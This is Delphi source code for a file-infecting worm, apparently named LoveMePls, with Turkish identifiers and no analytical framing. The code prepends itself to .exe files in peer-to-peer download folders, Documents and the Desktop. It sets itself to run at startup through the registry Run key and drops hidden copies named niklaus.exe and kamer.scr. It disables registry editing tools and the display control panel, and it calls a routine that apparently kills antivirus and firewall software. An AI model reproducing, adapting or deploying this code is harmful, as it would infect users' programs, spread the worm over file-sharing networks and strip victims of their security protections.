   Program LoveMePls;

   uses
     DirBul,
     FwAvKill,
     Windows;

   Var
   Sonuc1,Sonuc2,KaynakDosya,Dosya1Uz:String;
   Buffer:Pointer;BufSize:Integer;
   Deger:Integer;
   HndKey:Hkey;
   Const
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faAnyFile   = $0000003F;
   Type
     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
       end;
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

   //-SysUtils
   function StrToInt(const S: string): Integer;
   var
     E: Integer;
   begin
     Val(S, Result, E);
     if E <> 0 then Result:=0;
   end;
   function DirectoryExists(const Directory: string): Boolean;
   var
     Code: Integer;
   begin
     Code := GetFileAttributes(PChar(Directory));
     Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
   end;
   function CreateDir(const Dir: string): Boolean;
   begin
     Result := CreateDirectory(PChar(Dir), nil);
   End;
   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   End;

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
         LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;
   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   End;
   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;


   Function FileAge(const FileName: string): Integer;
   var
     Handle: THandle;
     FindData: TWin32FindData;
     LocalFileTime: TFileTime;
   begin
     Handle := FindFirstFile(PChar(FileName), FindData);
     if Handle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(Handle);
       if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
       begin
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
           LongRec(Result).Lo) then Exit;
       end;
     end;
     Result := -1;
   end;
   Function FileExists(const FileName: string): Boolean;
   Begin
     Result := FileAge(FileName) <> -1;
   End;
   //-SysUtilsEnd
   Function RandomStr(i: integer): String;
   Var
   k,Tmp: Integer;
   Harf,Str: String;
   Begin
   str:='';
   Harf:='qwertyuopasdfghjklizxcvbnm';
   For k:=1 To i Do
   Begin
    Tmp:=Random(Length(Harf));
    If Tmp = 0 Then Tmp:=1;
    Str:=Str+Harf[Tmp];
   End;
   Result:=Str;
   End;
   Function Windizin:String;
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;

   Function AutoStart(WormLocation,RegAdi:String):String;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\Run',1,KEY_ALL_ACCESS,HndKey);
   RegSetValueEx(hndKey,Pchar(RegAdi),0,REG_SZ,Pchar(WormLocation),Length(WormLocation));
   RegCloseKey(hndKey);
   End;
   Procedure Parcala(Uz1 :Integer; KaynakDosya, Cikti1, Cikti2: String);
   Var
   FromF,ToF1,ToF2:File;
   Okunan,Yazilan,Tmp:Integer;
   Buf: array[1..1024] of Char;
   Uygun:Boolean;
   Begin
    FileMode:=2;
    AssignFile(FromF, KaynakDosya);
    Reset(FromF, 1);
   If FileSize(FromF) > Uz1 Then
   Begin
    {$I-}
    AssignFile(ToF1, Cikti1);
    ReWrite(ToF1, 1);
    CloseFile(ToF1);
    Uygun:= (IOResult = 0);
    {$I+}
   If Uygun Then
   Begin
    AssignFile(ToF1, Cikti1);
    ReWrite(ToF1, 1);
   End;
    AssignFile(ToF2, Cikti2);
    Rewrite(ToF2, 1);

    Tmp:=0;

     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       If Uygun Then BlockWrite(ToF1, Buf, Okunan, Yazilan);
       Tmp:=Tmp+Okunan;
     until (Tmp>Uz1-1);
     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       BlockWrite(ToF2, Buf, Okunan, Yazilan);
     until (Okunan = 0) or (Yazilan <> Okunan);

   If Uygun Then CloseFile(ToF1);
     CloseFile(ToF2);
     CloseFile(FromF);
   End Else
   Begin
    If Not FileExists(Windizin+'niklaus.exe') Then
    CopyFile(pchar(ParamStr(0)),pchar(Windizin+'niklaus.exe'), FALSE);
    CloseFile(FromF);
   End;

   End;
   Function Bulasmismi(HedefDosya:String):Boolean;
   Var
    Dosya1S:String;
    Dosya1F,Dosya2F:File;
    Okunan1,Okunan2:Array[0..2048] of Byte;
    i:Integer;
    Uygun:Boolean;
   Begin
    FileMode:=2;
   {$I-}
    AssignFile(Dosya1F, HedefDosya);
    Reset(Dosya1F, 1);
    CloseFile(Dosya1F);
   {$I+}
    Uygun:= (IOResult = 0) and (HedefDosya <> '');
    FileMode:=0;
    If Uygun=True Then
    Begin
     Dosya1S:=Windizin+'kamer.scr';
     CopyFile(pchar(ParamStr(0)),Pchar(Dosya1S), FALSE);
     AssignFile(Dosya1F, HedefDosya);
     Reset(Dosya1F, 1);
     AssignFile(Dosya2F, Dosya1S);
     Reset(Dosya2F, 1);

     BlockRead(Dosya1F,Okunan1,SizeOf(Okunan1));
     BlockRead(Dosya2F,Okunan2,SizeOf(Okunan2));

     For i:=0 To 2048 Do
      Begin
       If Okunan1[i] <> Okunan2[i] Then
        Begin
         Result:=False;
         Break;
        End
        Else
         Result:=True;
      End;
       CloseFile(Dosya1F);
       CloseFile(Dosya2F);
    End
    Else
    Result:=True;
   End;
   Procedure Birlestir(Dosya2S:String);
   Var
    Dosya1S,HedefDosya1:String;
    Dosya1,Dosya2,HedefDosya:File;
    Okunan,Yazilan:Integer;
    Buf: array[1..2048] of Char;
   Begin
   If Bulasmismi(Dosya2S) = False Then
   Begin
    Dosya1S:=Windizin+'kamer.scr';
    HedefDosya1:=Dosya2S+'.Tmp';
    FileMode:=0;
    AssignFile(Dosya1, Dosya1S);
    Reset(Dosya1, 1);
    AssignFile(Dosya2, Dosya2S);
    Reset(Dosya2, 1);
    AssignFile(HedefDosya, HedefDosya1);
    Rewrite(HedefDosya, 1);

    Repeat
     BlockRead(Dosya1, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);
    Repeat
     BlockRead(Dosya2, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);

    CloseFile(HedefDosya);
    CloseFile(Dosya1);
    CloseFile(Dosya2);
    CopyFile(Pchar(HedefDosya1),Pchar(Dosya2S), FALSE);
    DeleteFile(Pchar(HedefDosya1));
   End;
   End;
   Procedure BulBulas(Klasor:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If FindFirst (Klasor+'\*.exe' , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Birlestir(Klasor+'\'+Bulunan.Name);
    Until FindNext(Bulunan)<>0;
   End;
    If FindFirst(Klasor+'\*.*', faDirectory,Bulunan) = 0 Then
    Repeat
     If (Bulunan.Name <> '.') and (Bulunan.Name <> '..') and (Bulunan.Attr=faDirectory) Then
     Begin
     BulBulas(Klasor+'\'+Bulunan.Name);
     End;
    Until FindNext(Bulunan)<> 0;
    FindClose(Bulunan);
   End;
   Procedure BulSil(Klasor,Ext:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If FindFirst (Klasor+'\*.'+Ext , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Try
    DeleteFile(Pchar(Klasor+'\'+Bulunan.Name));
    Except
    End;
    Until FindNext(Bulunan)<>0;
   End;
   End;
   Procedure KazaaInfect;
   var
   Value:Boolean;
   Begin
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    1,KEY_ALL_ACCESS,HndKey);
   Value:=False;Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableSharing',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   If (DlDir0<>'') And DirectoryExists(DlDir0) Then BulBulas(DlDir0); //Kazaa1
   If (DlDir1<>'') And DirectoryExists(DlDir1) Then BulBulas(DlDir1); //Kazaa2
   If (DlDir2<>'') And DirectoryExists(DlDir2) Then BulBulas(DlDir2); //ShareAza
   If (DlDir3<>'') And DirectoryExists(DlDir3) Then BulBulas(DlDir3); //LimeWire
   If (DlDir4<>'') And DirectoryExists(DlDir4) Then BulBulas(DlDir4); //Imesh
   If (DlDir5<>'') And DirectoryExists(DlDir5) Then BulBulas(DlDir5); //IE
   If (DlDir6<>'') And DirectoryExists(DlDir6) Then BulBulas(DlDir6); //Documents
   If (DlDir7<>'') And DirectoryExists(DlDir7) Then BulBulas(DlDir7); //Desktop
   If (DlDir8<>'') And DirectoryExists(DlDir8) Then BulBulas(DlDir8); //ICQ Receive
   If DirectoryExists('C:\My Downloads') Then BulBulas('C:\My Downloads');
                                        //Gnutella
                                        //NeoModus
                                        //BearShare
                                        //Icq Shared Folder
                                        //Edonkey
                                        //Morpheus
   End;

   Procedure KayitAyarlari(Value:Boolean);
   Begin
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
    1,KEY_ALL_ACCESS,HndKey);
   Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableRegistryTools',0,REG_DWORD,@Deger,BufSize);
   RegSetValueEx(hndKey,'NoDispCPL',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   Deger:=ord(2);
   BufSize:=SizeOf(Deger);
   RegOpenKeyEx(HKEY_CURRENT_USER,
   'Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced',
   1,KEY_ALL_ACCESS,HndKey);
   RegSetValueEx(hndKey,'Hidden',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(HndKey);
   End;
   //-

   Begin

   //
   Randomize;
   Sonuc1:=Windizin+'niklaus.exe';
   Sonuc2:=Windizin+'Temp\Binary32\'+RandomStr(6)+'.exe';
   KaynakDosya:=Windizin+'Temp\Binary32\'+RandomStr(6)+'.exe';
   Dosya1Uz:='15872';
   //
   If ParamStr(0) <> Sonuc1 Then Begin
   Try
    BulSil(Windizin+'Temp\Binary32','exe');
    If FileExists(Sonuc1) Then DeleteFile(Pchar(Sonuc1));
    If FileExists(Sonuc2) Then DeleteFile(Pchar(Sonuc2));
    If Not DirectoryExists(Windizin+'Temp\Binary32') Then CreateDir(Windizin+'Temp\Binary32');
    CopyFile(pchar(ParamStr(0)),Pchar(KaynakDosya), False);
    Parcala(StrToInt(Dosya1Uz), KaynakDosya, Sonuc1, Sonuc2);
    DeleteFile(Pchar(KaynakDosya));
    AutoStart(Sonuc1,'nikLaus');
   // If FileExists(Sonuc1) Then WinExec(pchar(Sonuc1),SW_NORMAL);
    If FileExists(Sonuc2) Then WinExec(pchar(Sonuc2),SW_SHOW);
    PostQuitMessage(0);
   Except;
   End;
    Halt(0);
   End;
   AutoStart(ParamStr(0),'nikLaus');
   KayitSil;
   AvFwKill;
   If Not FileExists(Windizin+'kamer.scr') Then
   CopyFile(pchar(ParamStr(0)),pchar(Windizin+'kamer.scr'), FALSE);
   SetFileAttributes(PChar(Paramstr(0)),FILE_ATTRIBUTE_HIDDEN);
   KayitAyarlari(True);

   KazaaInfect;


   End.
